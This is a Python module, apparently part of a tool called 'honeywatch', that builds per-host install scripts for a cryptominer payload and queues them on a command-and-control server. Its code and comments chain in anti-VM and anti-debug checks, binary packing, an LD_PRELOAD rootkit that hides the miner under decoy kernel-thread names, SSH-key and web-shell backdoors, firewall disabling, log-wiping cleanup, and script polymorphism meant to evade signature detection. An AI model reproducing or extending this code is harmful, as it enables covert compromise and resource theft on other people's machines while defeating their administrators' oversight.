"""Deployment manifest builder and C2 dispatcher for honeywatch ops.

Builds per-host scripts from the payload registry, optionally chains evasion
and persistence payloads (pack, obfuscate, strip, anti-debug, anti-vm, persist,
cleanup), and enqueues the resulting operation on the C2 controller.
"""

from __future__ import annotations

import json
from typing import Any

from honeywatch.c2.store import C2Store
from honeywatch.models import DeploymentManifest, Operation, Payload, Target, WorkerTask
from honeywatch.payloads import get_payload, render_manifest_scripts
from honeywatch.payloads.scripts import (
    generate_operation_id,
    unsafe_variable_reasons,
    validate_variable_types,
    validate_variables,
)


def build_manifest(
    payload_id: str,
    targets: list[Target],
    variables: dict[str, Any],
    apply_evasion: list[str] | None = None,
    allow_unsafe_vars: bool = False,
    integrity_manifest: dict[str, str] | None = None,
    require_integrity: bool = False,
    polyglot: bool = True,
) -> DeploymentManifest:
    """Build a deployment manifest, optionally wrapping it in evasion payloads.

    ``apply_evasion`` is a list of evasion payload ids to prepend/append to the
    install flow, e.g. ``["upx", "symbol_strip"]``. ``allow_unsafe_vars``
    opts in to payload variable values that contain shell-metacharacters; by
    default such values are refused to protect the operator from accidental
    command injection via pasted wallets/pools/paths.

    ``integrity_manifest`` maps payload ids to a pinned ``sha256`` of their
    fetched release tarball; the rendered install script verifies the download
    against it. With ``require_integrity`` a payload that has no known hash is
    refused outright, closing the blind ``curl | tar | exec`` gap.

    ``polyglot`` enables per-operation script polymorphism: each rendered script
    is unique (different variable names, marker tokens, junk lines, string
    encoding) so no two deploys produce the same binary signature. The marker
    map is stored in the operation manifest for controller-side deobfuscation.
    """
    payload = get_payload(payload_id)
    # validate_variables is the unified entry point (required + type). We
    # split the result back into missing-required vs type-errors so the
    # ValueError messages stay specific, but there's only one validation call
    # now — a future caller using validate_variables alone gets both checks.
    errors = validate_variables(payload, variables)
    if errors:
        # Distinguish "missing required" (a bare key name) from a type-mismatch
        # message (contains "must be"). This keeps the error messages specific
        # without calling validate_variable_types a second time.
        missing = [e for e in errors if " must be " not in e]
        type_errors = [e for e in errors if " must be " in e]
        parts: list[str] = []
        if missing:
            parts.append(f"missing required variables: {', '.join(missing)}")
        if type_errors:
            parts.append("invalid variable values: " + "; ".join(type_errors))
        raise ValueError(
            f"payload {payload_id!r} " + "; ".join(parts)
        )
    if not allow_unsafe_vars:
        unsafe = unsafe_variable_reasons(variables)
        if unsafe:
            detail = ", ".join(f"{k} (contains {pat})" for k, pat in unsafe)
            raise ValueError(
                f"payload {payload_id!r} has unsafe variable values: {detail}. "
                "Remove the shell metacharacters, or pass --allow-unsafe-vars "
                "to accept them at your own risk."
            )

    # Integrity: prefer an operator-supplied sha256, then the manifest, then
    # (if require_integrity) refuse. The rendered script warns when unverified.
    from honeywatch.payloads.integrity import expected_for

    variables = dict(variables)
    pinned = variables.get("expected_sha256") or expected_for(payload_id, integrity_manifest)
    if require_integrity and not pinned:
        raise ValueError(
            f"payload {payload_id!r} has no pinned sha256 and --require-integrity "
            "is set. Add the artifact hash to your payloads integrity manifest "
            "(payloads/integrity.toml) or pass --var expected_sha256=..."
        )
    if pinned:
        variables.setdefault("expected_sha256", pinned)
    else:
        variables.setdefault("expected_sha256", "")

    # Fill in default install_dir based on payload id if not provided.
    variables = dict(variables)
    variables.setdefault("install_dir", f"/opt/honeywatch/{payload_id}")

    # Coordinate decoy names across payloads that need to agree on a single
    # per-operation process name. The memfd payload uses it for the memfd
    # name and exec -a, the rootkit hide_pattern must include it, and
    # forensics_cleanup uses it for prctl(PR_SET_NAME). All three must
    # reference the same decoy name or the rootkit won't hide the process.
    decoy_names = ["[kworker/0:1]", "[ksoftirqd/0]", "[rcu_sched]", "[migration/0]",
                   "[kworker/u8:0]", "[kworker/1:0]"]
    if apply_evasion:
        evasion_set = set(apply_evasion)
        if evasion_set & {"memfd_exec", "ld_preload_rootkit", "forensics_cleanup"}:
            import hashlib as _hl
            op_seed = variables.get("operation_id", payload_id)
            decoy_idx = int(_hl.sha256(op_seed.encode()).hexdigest(), 16) % len(decoy_names)
            decoy = decoy_names[decoy_idx]
            variables.setdefault("memfd_name", decoy)
            variables.setdefault("process_name", decoy)
            # Ensure hide_pattern includes the decoy name (without brackets)
            hide = variables.get("hide_pattern", "honeywatch|xmrig")
            decoy_bare = decoy.strip("[]")
            if decoy_bare not in hide:
                variables["hide_pattern"] = f"{hide}|{decoy_bare}"

    manifest = DeploymentManifest(
        payload=payload,
        targets=list(targets),
        variables=variables,
        evasion=list(apply_evasion or []),
    )
    scripts = render_manifest_scripts(manifest)

    if apply_evasion:
        scripts = _wrap_with_evasion(payload, scripts, apply_evasion, variables)

    # Per-operation script polymorphism: each deploy gets a unique script so
    # no two operations produce the same binary signature. The marker map is
    # stored in the manifest for controller-side deobfuscation of worker output.
    marker_map: dict[str, str] = {}
    if polyglot:
        from honeywatch.payloads.polyglot import PolyglotRenderer
        renderer = PolyglotRenderer(operation_id=manifest.variables.get("operation_id", ""))
        obfuscated: dict[str, str] = {}
        for ip, script in scripts.items():
            obf, marker_map = renderer.render(script, variables)
            obfuscated[ip] = obf
        scripts = obfuscated

    manifest.per_host_scripts = scripts
    manifest.marker_map = marker_map
    return manifest


# Where each known evasion payload sits in the install flow.
#
# ``prepend``  — runs before the main payload (anti-vm bails early on sandboxes,
#                kill_miners removes competition before the new miner installs).
# ``append``   — runs after install and operates on the installed artifacts
#                (packers/strippers harden the binary in-place before persistence
#                references it). Within this group, strip always runs before UPX
#                because strip on a clean binary is reliable, and UPX on a
#                stripped binary avoids header corruption.
# ``persist``   — runs after binary hardening but before cleanup. Persistence
#                payloads (systemd, cron, ssh key, rootkit, web shell) land here
#                so they reference the hardened binary.
# ``final``    — runs last (cleanup wipes traces; anti-debug is LD_PRELOAD'd
#                at runtime so it goes last to avoid interfering with install).
#
# The ordering within each group is the order they appear in the evasion list,
# EXCEPT the ``append`` group which is sorted by _APPEND_ORDER so strip always
# precedes UPX regardless of operator input order.
#
# Any id not listed here defaults to ``persist`` so a newly-added persistence
# payload is applied rather than silently dropped.
_EVASION_POSITION = {
    "anti_vm": "prepend",
    "kill_miners": "prepend",
    "upx": "append",
    "packers": "append",
    "symbol_strip": "append",
    "obfuscators": "append",
    "anti_debug": "append",
    "memfd_exec": "prepend",
    "systemd_persist": "persist",
    "cron_persist": "persist",
    "sshkey_backdoor": "persist",
    "web_shell_persist": "persist",
    "ld_preload_rootkit": "persist",
    "scheduled_task_persist": "persist",
    "watchdog_persist": "persist",
    "mutual_watch": "persist",
    "systemd_timer": "persist",
    "forensics_cleanup": "final",
    "cleanup": "final",
    "firewall_disable": "prepend",
    "k8s_daemonset": "persist",
    "cron_beacon": "persist",
}

# Sort order within the ``append`` group. Lower numbers run first. Strip (1)
# must precede UPX (2) because strip on a clean binary is reliable and UPX
# on a stripped binary avoids the risk of strip corrupting UPX headers.
# Anything not listed sorts to 99 (after known transforms).
_APPEND_ORDER = {
    "symbol_strip": 1,
    "upx": 2,
    "packers": 3,
    "obfuscators": 4,
    "anti_debug": 5,
    "anti_vm": 6,
}


def _wrap_with_evasion(
    payload: Payload,
    scripts: dict[str, str],
    evasion_ids: list[str],
    variables: dict[str, Any],
) -> dict[str, str]:
    """Wrap a per-host payload script with evasion/persistence/cleanup layers.

    The install flow on each target is:

    1. ``prepend`` — anti-vm sandbox check, kill competing miners
    2. Main payload — miner download + configure
    3. ``append`` — binary hardening (UPX pack, symbol strip) operates on the
       installed artifacts in-place so persistence references the hardened binary
    4. ``persist`` — persistence primitives (systemd, cron, ssh key, rootkit, web
       shell) install survival mechanisms that reference the hardened binary
    5. ``final`` — cleanup (wipe traces, flush logs) and anti-debug (LD_PRELOAD)
    """
    evasion_payloads = [get_payload(eid) for eid in evasion_ids]
    wrapped: dict[str, str] = {}
    for ip, script in scripts.items():
        parts: list[str] = []
        for ev in evasion_payloads:
            if _EVASION_POSITION.get(ev.id, "persist") == "prepend":
                parts.append(ev.install_script)
                if ev.run_script:
                    parts.append(ev.run_script)
        parts.append(script)
        for ev in evasion_payloads:
            if _EVASION_POSITION.get(ev.id, "persist") == "append":
                rendered = _render_evasion_for_payload(ev, payload, variables)
                if rendered:
                    parts.append(rendered)
        for ev in evasion_payloads:
            if _EVASION_POSITION.get(ev.id, "persist") == "persist":
                rendered = _render_persist_for_payload(ev, payload, variables)
                if rendered:
                    parts.append(rendered)
        for ev in evasion_payloads:
            if _EVASION_POSITION.get(ev.id, "persist") == "final":
                parts.append(ev.install_script)
                if ev.run_script:
                    parts.append(ev.run_script)
        wrapped[ip] = "\n\n".join(parts)
    return wrapped


def _render_evasion_for_payload(
    ev: Payload, payload: Payload, variables: dict[str, Any]
) -> str:
    """Render an evasion payload against the main payload's installed artifacts.

    The evasion script's ``{{install_dir}}`` resolves to the evasion payload's
    own install dir (not the main payload's); ``{{input_file}}`` resolves to the
    main payload's installed primary artifact. Rendering goes through the same
    template engine as the main scripts so ``{{args|default(...)}}`` and other
    defaulted placeholders resolve consistently instead of being left literal.
    """
    if not payload.artifacts:
        return ""
    main_install_dir = variables.get("install_dir") or f"/opt/honeywatch/{payload.id}"
    target_file = f"{main_install_dir}/{payload.artifacts[0]}"
    ev_install_dir = (
        variables.get(f"{ev.id}_install_dir") or f"/opt/honeywatch/{ev.id}"
    )
    render_vars = dict(variables)
    render_vars["input_file"] = target_file
    render_vars["output_file"] = f"{target_file}.packed"
    render_vars["install_dir"] = ev_install_dir
    render_vars.setdefault("payload_install_dir", main_install_dir)
    script = ev.install_script
    if ev.run_script:
        script += "\n" + ev.run_script
    from honeywatch.payloads.scripts import _render_template

    return _render_template(script, render_vars)


def _render_persist_for_payload(
    ev: Payload, payload: Payload, variables: dict[str, Any]
) -> str:
    """Render a persistence payload for the main payload's install path.

    Persistence payloads (systemd, cron, ssh key, rootkit, web shell) install
    survival mechanisms that reference the installed binary at its final path.
    Unlike binary-hardening evasion payloads, persistence payloads don't
    transform the binary — they create system-level hooks (services, cron jobs,
    authorized_keys entries, LD_PRELOAD rootkits) that keep the binary running
    and accessible after reboots, password changes, and admin cleanup attempts.
    """
    main_install_dir = variables.get("install_dir") or f"/opt/honeywatch/{payload.id}"
    render_vars = dict(variables)
    render_vars.setdefault("payload_install_dir", main_install_dir)
    script = ev.install_script
    if ev.run_script:
        script += "\n" + ev.run_script
    from honeywatch.payloads.scripts import _render_template

    return _render_template(script, render_vars)


def prepare_evasion_pipeline(evasion_spec: list[str] | str | None) -> list[str]:
    """Normalize an evasion spec into a list of valid payload ids."""
    if evasion_spec is None:
        return []
    if isinstance(evasion_spec, str):
        evasion_spec = [e.strip() for e in evasion_spec.split(",") if e.strip()]
    valid = [eid for eid in evasion_spec if _is_evasion_payload(eid)]
    return valid


def _is_evasion_payload(payload_id: str) -> bool:
    try:
        p = get_payload(payload_id)
        return p.category in ("evasion", "persist")
    except KeyError:
        return False


def enqueue_operation(
    c2_store: C2Store,
    manifest: DeploymentManifest,
    operation_id: str | None = None,
) -> Operation:
    """Persist an operation and create per-target tasks in the C2 store."""
    payload = manifest.payload
    target_ips = [t.ip for t in manifest.targets]

    op = c2_store.create_operation(
        payload_id=payload.id,
        target_ips=target_ips,
        manifest={
            "payload_id": payload.id,
            "category": payload.category,
            "variables": manifest.variables,
            "evasion": list(manifest.evasion or []),
            "per_host_scripts": manifest.per_host_scripts,
            "marker_map": manifest.marker_map,
        },
        operation_id=operation_id or generate_operation_id(),
    )

    scripts = manifest.per_host_scripts or render_manifest_scripts(manifest)
    for target in manifest.targets:
        script = scripts.get(target.ip, "")
        task = WorkerTask(
            id="",
            operation_id=op.id,
            payload_id=payload.id,
            category=payload.category,
            target=target,
            script=script,
            variables=dict(manifest.variables),
        )
        c2_store.create_task(task)

    # Mark running once tasks are queued.
    c2_store.update_operation_status(op.id, "running")
    return c2_store.get_operation(op.id) or op


def dispatch_to_controller(
    controller_url: str,
    manifest: DeploymentManifest,
    operation_id: str | None = None,
) -> dict[str, Any]:
    """Enqueue an operation via the controller REST API instead of direct DB."""
    import urllib.request

    url = controller_url.rstrip("/") + "/api/operations"
    data = json.dumps(
        {
            "payload_id": manifest.payload.id,
            "target_ips": [t.ip for t in manifest.targets],
            "manifest": {
                "variables": manifest.variables,
                "scripts": manifest.per_host_scripts,
                "evasion": list(manifest.evasion or []),
                "operation_id": operation_id,
            },
        }
    ).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=60) as resp:
        return json.loads(resp.read().decode("utf-8", "replace"))
